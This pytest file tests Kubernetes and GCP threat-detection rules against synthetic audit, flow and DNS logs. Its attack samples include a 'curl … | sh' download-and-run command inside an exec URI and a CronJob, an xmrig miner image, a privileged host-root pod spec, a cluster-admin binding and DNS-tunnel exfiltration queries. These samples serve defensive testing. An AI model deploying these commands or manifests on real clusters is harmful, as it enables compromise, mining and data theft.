"""Native k8s_* / gcp_* cloud rules (config/rules_cloud.yaml, track K8s + GCP): one true positive and one near miss per
rule, over made-up records in every ingest shape (generic / EKS / AKS Kubernetes audit, GKE + GCP Cloud Audit Logs,
VPC flow, Cloud DNS). Records go through the real Stage 0 / Stage 1 ingest, then detect_cloud."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from attacklens.config import load_config

from .conftest import run_ingest
from .test_detect_cloud import run, subset

T0 = 1792807200000          # 2026-10-24T02:00:00Z
DAY, MIN = 86_400_000, 60_000
CL = "prod-eks-1"
PROJ = "corp-prod-1234"
ATT = "203.0.113.50"


def iso(ms: int) -> str:
    from datetime import datetime, timezone
    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def k8s(ts: int, user: str, verb: str, res: str, *, ns: str | None = "default", name: str | None = None,
        sub: str | None = None, code: int = 200, ip: str = "198.51.100.7", req: dict | None = None,
        uri: str | None = None, groups: list[str] | None = None, stage: str = "ResponseComplete") -> dict[str, Any]:
    ref = {k: v for k, v in (("resource", res), ("namespace", ns), ("name", name), ("subresource", sub),
                             ("apiVersion", "v1")) if v}
    d: dict[str, Any] = {"kind": "Event", "apiVersion": "audit.k8s.io/v1", "level": "Request",
                         "auditID": f"{ts:x}-{verb}-{res}-{name}-{stage}", "stage": stage,
                         "requestURI": uri or f"/api/v1/namespaces/{ns}/{res}" + (f"/{name}" if name else ""),
                         "verb": verb, "user": {"username": user, "groups": groups or ["system:authenticated"]},
                         "sourceIPs": [ip], "userAgent": "kubectl/v1.30.2 (linux/amd64) kubernetes/39683505",
                         "objectRef": ref, "requestReceivedTimestamp": iso(ts), "stageTimestamp": iso(ts + 20),
                         "cluster_name": CL}
    if stage != "RequestReceived":
        d["responseStatus"] = {"metadata": {}, "code": code}
    if req is not None:
        d["requestObject"] = req
    return d


def pod(name: str, *, image: str = "registry.corp.example/app:1.4", priv: bool = False, host_path: str | None = None,
        host_pid: bool = False, cmd: list[str] | None = None) -> dict[str, Any]:
    c: dict[str, Any] = {"name": "c", "image": image}
    if priv:
        c["securityContext"] = {"privileged": True}
    if cmd:
        c["command"] = cmd
    spec: dict[str, Any] = {"containers": [c]}
    if host_pid:
        spec["hostPID"] = True
    if host_path:
        spec["volumes"] = [{"name": "h", "hostPath": {"path": host_path, "type": ""}}]
    return {"kind": "Pod", "apiVersion": "v1", "metadata": {"name": name}, "spec": spec}


def gcp(ts: int, principal: str, svc: str, method: str, *, res: str = "", ip: str = ATT, code: int = 0,
        log: str = "activity", request: dict | None = None, metadata: dict | None = None,
        metadata_json: str | None = None, delta: dict | None = None, rtype: str = "project") -> dict[str, Any]:
    pp: dict[str, Any] = {"@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                          "authenticationInfo": {"principalEmail": principal}, "serviceName": svc, "methodName": method,
                          "resourceName": res, "requestMetadata": {"callerIp": ip, "callerSuppliedUserAgent": "gcloud"},
                          "status": {"code": code} if code else {}}
    for k, v in (("request", request), ("metadata", metadata), ("metadataJson", metadata_json), ("serviceData", delta)):
        if v is not None:
            pp[k] = v
    return {"protoPayload": pp, "insertId": f"{ts:x}{method[-12:]}{res[-8:]}", "timestamp": iso(ts),
            "resource": {"type": rtype, "labels": {"project_id": PROJ}},
            "logName": f"projects/{PROJ}/logs/cloudaudit.googleapis.com%2F{log}"}


def flow(ts: int, src: str, dst: str, dport: int, vm: str) -> dict[str, Any]:
    return {"insertId": f"f{ts:x}{dport}{dst}", "timestamp": iso(ts + 5000),
            "jsonPayload": {"reporter": "SRC", "start_time": iso(ts), "bytes_sent": "4096",
                            "connection": {"src_ip": src, "src_port": 40000, "dest_ip": dst, "dest_port": dport,
                                           "protocol": 6},
                            "src_instance": {"vm_name": vm, "project_id": PROJ}},
            "resource": {"type": "gce_subnetwork", "labels": {"project_id": PROJ}}}


def dns(ts: int, vm: str, name: str, qtype: str = "A", rcode: str = "NOERROR") -> dict[str, Any]:
    return {"insertId": f"d{ts:x}{name[:20]}", "timestamp": iso(ts),
            "jsonPayload": {"queryName": name + ".", "queryType": qtype, "responseCode": rcode, "sourceIP": "10.128.0.21",
                            "vmInstanceName": vm, "vmProjectId": PROJ},
            "resource": {"type": "dns_query", "labels": {"project_id": PROJ}}}


def build() -> dict[str, list[dict[str, Any]]]:
    gen: list[dict] = []
    # ---- history (5 days): alice execs daily from home, mallory (dev2) reads pods from home, cluster noise
    for d in range(5, 0, -1):
        base = T0 - d * DAY
        gen.append(k8s(base + 3 * 3_600_000, "alice@corp.example", "create", "pods", ns="payments", name="api-1",
                       sub="exec", code=101, uri="/api/v1/namespaces/payments/pods/api-1/exec?command=sh&stdin=true"))
        for i in range(15):
            gen.append(k8s(base + i * 10 * MIN, "dev2@corp.example", "get", "pods", ns="payments", name=f"api-{i}",
                           ip="198.51.100.8"))
            gen.append(k8s(base + i * 10 * MIN + 1, "alice@corp.example", "list", "pods", ns="payments"))
    a = T0
    m = "dev2@corp.example"
    gen += [
        # new network for dev2 (k8s_api_new_network) + exec with a download-and-run command (k8s_pod_exec 75)
        k8s(a, m, "create", "pods", ns="payments", name="api-7", sub="exec", code=101, ip=ATT, stage="RequestReceived",
            uri="/api/v1/namespaces/payments/pods/api-7/exec?command=sh&command=-c&command=curl+-s+http%3A%2F%2F203.0.113.9%2Fx+%7C+sh&container=api"),
        k8s(a, m, "create", "pods", ns="payments", name="api-7", sub="exec", code=101, ip=ATT,
            uri="/api/v1/namespaces/payments/pods/api-7/exec?command=sh&command=-c&command=curl+-s+http%3A%2F%2F203.0.113.9%2Fx+%7C+sh&container=api"),
        # alice: routine exec from her usual network (near miss for new network; exec stays at 50)
        k8s(a + MIN, "alice@corp.example", "create", "pods", ns="payments", name="api-2", sub="exec", code=101,
            uri="/api/v1/namespaces/payments/pods/api-2/exec?command=sh&stdin=true"),
        # discovery: 7 sensitive resource types (k8s_api_discovery) vs alice's `kubectl get all` (near miss)
        *[k8s(a + 2 * MIN + i * 1000, m, "list", r, ns=None, ip=ATT, code=403 if i < 3 else 200)
          for i, r in enumerate(["secrets", "clusterrolebindings", "nodes", "serviceaccounts", "roles",
                                 "clusterroles", "namespaces"])],
        *[k8s(a + 2 * MIN + i * 1000, "alice@corp.example", "list", r, ns="payments")
          for i, r in enumerate(["pods", "services", "deployments", "replicasets", "statefulsets", "daemonsets",
                                 "jobs", "cronjobs", "horizontalpodautoscalers"])],
        # secrets sweep across 4 namespaces (80) vs argocd's operator listing (allow-listed 35) vs 3 reads (none)
        *[k8s(a + 4 * MIN + i * 2000, m, "get", "secrets", ns=["payments", "shop", "kube-system", "data"][i % 4],
              name=f"s{i}", ip=ATT) for i in range(10)],
        *[k8s(a + 4 * MIN + i * 2000, "system:serviceaccount:argocd:argocd-application-controller", "get", "secrets",
              ns=f"team{i}", name="repo-creds", ip="10.42.0.9") for i in range(12)],
        *[k8s(a + 4 * MIN + i * 2000, "alice@corp.example", "get", "secrets", ns="payments", name=f"db{i}")
          for i in range(3)],
        # privileged deployment (T1610 70), host-root pod (T1611 85), controller + CI near misses
        k8s(a + 6 * MIN, m, "create", "deployments", name="dbg", ip=ATT, code=201,
            req={"kind": "Deployment", "spec": {"template": pod("dbg", priv=True)}}),
        k8s(a + 7 * MIN, m, "create", "pods", name="root", ip=ATT, code=201,
            req=pod("root", image="docker.io/library/alpine:3", host_path="/", host_pid=True, priv=True)),
        k8s(a + 7 * MIN, "system:serviceaccount:kube-system:daemon-set-controller", "create", "pods", ns="kube-system",
            name="calico-node-x", ip="10.0.0.2", code=201, req=pod("calico-node-x", priv=True, host_path="/lib/modules")),
        k8s(a + 7 * MIN, "system:serviceaccount:ci:terraform", "create", "daemonsets", ns="monitoring",
            name="node-exporter", ip="10.42.0.10", code=201,
            req={"kind": "DaemonSet", "spec": {"template": pod("ne", image="quay.io/prometheus/node-exporter:v1",
                                                               host_pid=True, host_path="/proc")}}),
        # cluster-admin binding (80) vs a view binding (none)
        k8s(a + 8 * MIN, m, "create", "clusterrolebindings", ns=None, name="tmp-admin", ip=ATT, code=201,
            req={"kind": "ClusterRoleBinding", "subjects": [{"kind": "ServiceAccount", "name": "default", "namespace": "default"}],
                 "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "cluster-admin"}}),
        k8s(a + 8 * MIN, "alice@corp.example", "create", "rolebindings", ns="payments", name="viewers", code=201,
            req={"kind": "RoleBinding", "subjects": [{"kind": "Group", "name": "qa"}],
                 "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "view"}}),
        # TokenRequest for a kube-system SA (75) vs kubelet's (system:node, none)
        k8s(a + 9 * MIN, m, "create", "serviceaccounts", ns="kube-system", name="clusterrole-aggregation-controller",
            sub="token", ip=ATT, code=201),
        k8s(a + 9 * MIN, "system:node:ip-10-0-1-5.ec2.internal", "create", "serviceaccounts", ns="payments", name="api",
            sub="token", ip="10.0.1.5", code=201),
        # CronJob with a miner image + curl|sh (80) vs CI's trusted job (automation 35)
        k8s(a + 10 * MIN, m, "create", "cronjobs", name="sync", ip=ATT, code=201,
            req={"kind": "CronJob", "spec": {"schedule": "*/5 * * * *", "jobTemplate": {"spec": {"template": pod(
                "sync", image="docker.io/xmrig/xmrig:latest", cmd=["sh", "-c", "curl -s http://203.0.113.9/x | sh"])}}}}),
        k8s(a + 10 * MIN, "system:serviceaccount:ci:terraform", "create", "cronjobs", name="backup", ip="10.42.0.10",
            code=201, req={"kind": "CronJob", "spec": {"jobTemplate": {"spec": {"template": pod("backup")}}}}),
    ]
    aks = [  # AKSAudit shape: anonymous list of pods (75) vs anonymous health probe (no objectRef) and a 403
        {"AuditId": "aks-1", "Stage": "ResponseComplete", "Verb": "list", "RequestUri": "/api/v1/pods",
         "User": {"username": "system:anonymous", "groups": ["system:unauthenticated"]}, "SourceIps": ["203.0.113.52"],
         "ObjectRef": {"resource": "pods", "apiVersion": "v1"}, "ResponseStatus": {"code": 200},
         "RequestReceivedTime": iso(a + 11 * MIN), "_ResourceId": "/subscriptions/s/resourcegroups/rg/providers/"
         "Microsoft.ContainerService/managedClusters/aks-prod-2"},
        {"AuditId": "aks-2", "Stage": "ResponseComplete", "Verb": "get", "RequestUri": "/version",
         "User": {"username": "system:anonymous", "groups": ["system:unauthenticated"]}, "SourceIps": ["203.0.113.53"],
         "ResponseStatus": {"code": 200}, "RequestReceivedTime": iso(a + 11 * MIN),
         "_ResourceId": "/subscriptions/s/resourcegroups/rg/providers/Microsoft.ContainerService/managedClusters/aks-prod-2"},
        {"AuditId": "aks-3", "Stage": "ResponseComplete", "Verb": "list", "RequestUri": "/api/v1/secrets",
         "User": {"username": "system:anonymous", "groups": ["system:unauthenticated"]}, "SourceIps": ["203.0.113.54"],
         "ObjectRef": {"resource": "secrets", "apiVersion": "v1"}, "ResponseStatus": {"code": 403},
         "RequestReceivedTime": iso(a + 11 * MIN),
         "_ResourceId": "/subscriptions/s/resourcegroups/rg/providers/Microsoft.ContainerService/managedClusters/aks-prod-2"},
    ]
    vpcsc_md = {"@type": "type.googleapis.com/google.cloud.audit.VpcServiceControlAuditMetadata",
                "violationReason": "RESOURCES_NOT_IN_SAME_SERVICE_PERIMETER",
                "egressViolations": [{"servicePerimeter": "accessPolicies/1/servicePerimeters/prod",
                                      "source": "projects/111", "targetResource": "projects/999"}]}
    bq = "bigquery.googleapis.com"

    def bqjob(kind: str, dest: str | None = None, billed: int | None = None) -> dict:
        job: dict[str, Any] = {"jobConfig": {"type": kind}, "jobStatus": {"jobState": "DONE"}}
        if dest:
            job["jobConfig"]["extractConfig"] = {"destinationUris": [dest], "sourceTable": "projects/p/datasets/d/tables/t"}
        if billed is not None:
            job["jobStats"] = {"queryStats": {"totalBilledBytes": str(billed)}}
        return {"@type": "type.googleapis.com/google.cloud.audit.BigQueryAuditMetadata", "jobChange": {"after": "DONE", "job": job}}

    gcpr = [
        gcp(a + 12 * MIN, "carol@corp.example", "k8s.io", "io.k8s.core.v1.pods.exec.create",   # GKE exec
            res="core/v1/namespaces/shop/pods/cart-5d8b/exec", rtype="k8s_cluster"),
        gcp(a + 13 * MIN, "eve@corp.example", "storage.googleapis.com", "google.storage.objects.create", log="policy",
            res="projects/_/buckets/drop-999/objects/dump.csv", code=7, metadata=vpcsc_md),
        gcp(a + 13 * MIN, "eve@corp.example", "compute.googleapis.com", "v1.compute.instances.insert", log="policy",
            res="projects/corp-prod-1234/zones/z/instances/x", code=9,
            metadata={"@type": "type.googleapis.com/google.cloud.audit.OrgPolicyViolationInfo"}),
        gcp(a + 14 * MIN, "eve@corp.example", bq, "jobservice.jobcompleted", log="data_access",
            metadata_json=json.dumps(bqjob("EXTRACT", dest="gs://drop-999/t-*.csv"))),          # metadataJson shape
        gcp(a + 14 * MIN, "dsingh@corp.example", bq, "google.cloud.bigquery.v2.JobService.InsertJob", log="data_access",
            metadata=bqjob("EXTRACT", dest="gs://corp-exports/t-*.csv")),
        gcp(a + 15 * MIN, "eve@corp.example", bq, "google.cloud.bigquery.v2.JobService.InsertJob", log="data_access",
            metadata=bqjob("QUERY", billed=64 * 1024 ** 3)),
        gcp(a + 15 * MIN, "dsingh@corp.example", bq, "google.cloud.bigquery.v2.JobService.InsertJob", log="data_access",
            metadata=bqjob("QUERY", billed=1024 ** 3)),
        gcp(a + 16 * MIN, "eve@corp.example", "run.googleapis.com", "google.cloud.run.v1.Services.SetIamPolicy",
            res="projects/p/locations/asia-south1/services/api",
            request={"policy": {"bindings": [{"role": "roles/run.invoker", "members": ["allUsers"]}]}}),
        gcp(a + 16 * MIN, "pmehta@corp.example", "run.googleapis.com", "google.cloud.run.v1.Services.SetIamPolicy",
            res="projects/p/locations/asia-south1/services/web",
            request={"policy": {"bindings": [{"role": "roles/run.invoker", "members": ["group:qa@corp.example"]}]}}),
        gcp(a + 17 * MIN, "eve@corp.example", "cloudfunctions.googleapis.com",
            "google.cloud.functions.v2.FunctionService.CreateFunction", res="projects/p/locations/l/functions/f",
            request={"function": {"serviceConfig": {"serviceAccountEmail": "123456789012-compute@developer.gserviceaccount.com"}}}),
        gcp(a + 18 * MIN, "eve@corp.example", "iam.googleapis.com",
            "google.iam.v1.WorkloadIdentityPools.CreateWorkloadIdentityPoolProvider", res="projects/p/locations/global/workloadIdentityPools/x",
            request={"workloadIdentityPoolProvider": {"oidc": {"issuerUri": "https://idp.evil.example"}}}),
        gcp(a + 18 * MIN, "pmehta@corp.example", "iam.googleapis.com",
            "google.iam.v1.WorkloadIdentityPools.CreateWorkloadIdentityPoolProvider", res="projects/p/locations/global/workloadIdentityPools/gh",
            request={"workloadIdentityPoolProvider": {"oidc": {"issuerUri": "https://token.actions.githubusercontent.com"},
                                                      "attributeCondition": "assertion.repository_owner == 'corp'"}}),
    ]
    flows = [flow(a + 20 * MIN + i * 60_000, "10.128.0.30", "203.0.113.80", 3333, "miner-vm") for i in range(4)] + \
            [flow(a + 20 * MIN + i * 60_000, "10.128.0.31", "203.0.113.81", 443, "web-1") for i in range(4)]
    dnsr = [dns(a + 21 * MIN + i * 1000, "db-backup-1", f"{i:02d}aGVsbG8gd29ybGQgdGhpcyBpcyBkYXRh.t1.exfil-cdn.example", "TXT")
            for i in range(45)] + \
           [dns(a + 21 * MIN + i * 1000, "web-1", f"{i:02d}aGVsbG8gd29ybGQgdGhpcyBpcyBkYXRh.storage.googleapis.com")
            for i in range(45)]
    return {"k8s": gen, "aks": aks, "gcp": gcpr, "flow": flows, "dns": dnsr}


@pytest.fixture(scope="module")
def ds(tmp_path_factory: pytest.TempPathFactory):
    tmp = tmp_path_factory.mktemp("k8sgcp_rules")
    raw = tmp / "raw"
    raw.mkdir()
    for name, recs in build().items():
        (raw / f"{name}.log").write_text("\n".join(json.dumps(r) for r in recs) + "\n", encoding="utf-8")
    ctx = run_ingest(raw, tmp)
    cfg = load_config()
    ids = {r["id"] for r in cfg["rules_cloud"]["rules"] if r["id"].startswith(("k8s_", "gcp_"))}
    st, alerts = run(ctx.con, subset(cfg, ids), tmp / "work", ctx.events_glob)
    yield {"st": st, "alerts": alerts, "ctx": ctx}
    ctx.con.close()


def of(ds: dict, rule: str) -> list[dict]:
    return [a for a in ds["alerts"] if a["rule_id"] == rule]


def who(ds: dict, rule: str) -> dict[str, int]:
    out: dict[str, int] = {}
    for a in of(ds, rule):
        k = a["src_user"] or a["host"]
        out[k] = max(out.get(k, 0), a["severity"])
    return out


def test_no_errors(ds) -> None:
    assert ds["st"]["errors"] == 0, ds["st"]["error_messages"]


def test_k8s_new_network(ds) -> None:
    w = who(ds, "k8s_api_new_network")
    # dev2 moved to a new /16 after 5 days of history; everyone else only has cold-start hits (no history: <= 30)
    assert w.pop("dev2") == 50 and all(s <= 30 for s in w.values())
    assert not [a for a in of(ds, "k8s_api_new_network") if a["src_user"] == "alice" and a["ts_ms"] >= T0]


def test_k8s_anonymous(ds) -> None:
    a = of(ds, "k8s_anonymous_access")
    assert [(x["host"], x["src_ip"], x["severity"]) for x in a] == [("aks-prod-2", "203.0.113.52", 75)]


def test_k8s_exec_severity_and_stage_dedupe(ds) -> None:
    w = who(ds, "k8s_pod_exec")
    assert w["dev2"] == 75 and w["alice"] == 35 and w["carol"] >= 35     # carol: GKE (gcp_audit_json) exec
    assert len([a for a in of(ds, "k8s_pod_exec") if a["src_user"] == "dev2"]) == 1   # RequestReceived not counted


def test_k8s_privileged_and_host_root(ds) -> None:
    a = of(ds, "k8s_privileged_workload")
    got = {(x["src_user"], x["technique_id"], x["severity"]) for x in a}
    assert ("dev2", "T1610", 70) in got and ("dev2", "T1611", 85) in got
    assert not any(x["src_user"] == "system:serviceaccount:kube-system:daemon-set-controller" for x in a)
    assert all(x["severity"] <= 40 for x in a if x["src_user"] == "system:serviceaccount:ci:terraform")


def test_k8s_cluster_admin_binding(ds) -> None:
    assert who(ds, "k8s_cluster_admin_binding") == {"dev2": 80}
    assert of(ds, "k8s_cluster_admin_binding")[0]["tactic"] == "Privilege Escalation"


def test_k8s_secrets_sweep(ds) -> None:
    w = who(ds, "k8s_secrets_sweep")
    assert w["dev2"] == 80 and "alice" not in w
    assert w.get("system:serviceaccount:argocd:argocd-application-controller", 35) <= 35


def test_k8s_token_discovery_cronjob(ds) -> None:
    assert who(ds, "k8s_sa_token_create") == {"dev2": 75}
    assert who(ds, "k8s_api_discovery") == {"dev2": 70}
    w = who(ds, "k8s_cronjob_persistence")
    assert w["dev2"] == 80 and w.get("system:serviceaccount:ci:terraform", 35) <= 35


def test_gcp_audit_rules(ds) -> None:
    assert who(ds, "gcp_vpcsc_violation") == {"eve": 55}
    assert who(ds, "gcp_bq_export_external") == {"eve": 75}                  # metadataJson; corp bucket: none
    assert who(ds, "gcp_bq_bulk_read") == {"eve": 60}
    assert who(ds, "gcp_serverless_public_invoker") == {"eve": 65}
    assert who(ds, "gcp_serverless_deploy") == {"eve": 75}
    assert who(ds, "gcp_wif_provider_untrusted") == {"eve": 80}


def test_gcp_network_rules(ds) -> None:
    assert {a["host"] for a in of(ds, "gcp_vpcflow_mining_port")} == {"miner-vm"}
    t = of(ds, "gcp_dns_tunnel")
    assert {a["host"] for a in t} == {"db-backup-1"} and max(a["severity"] for a in t) == 85


def test_entities_follow_conventions(ds) -> None:
    for a in ds["alerts"]:
        if a["rule_id"].startswith("k8s_") and a["src_user"] in ("dev2", "alice"):
            assert a["host"] == "prod-eks-1"
        if a["rule_id"].startswith("gcp_") and a["src_user"] == "eve":
            assert a["host"] == PROJ and a["src_ip"] == ATT
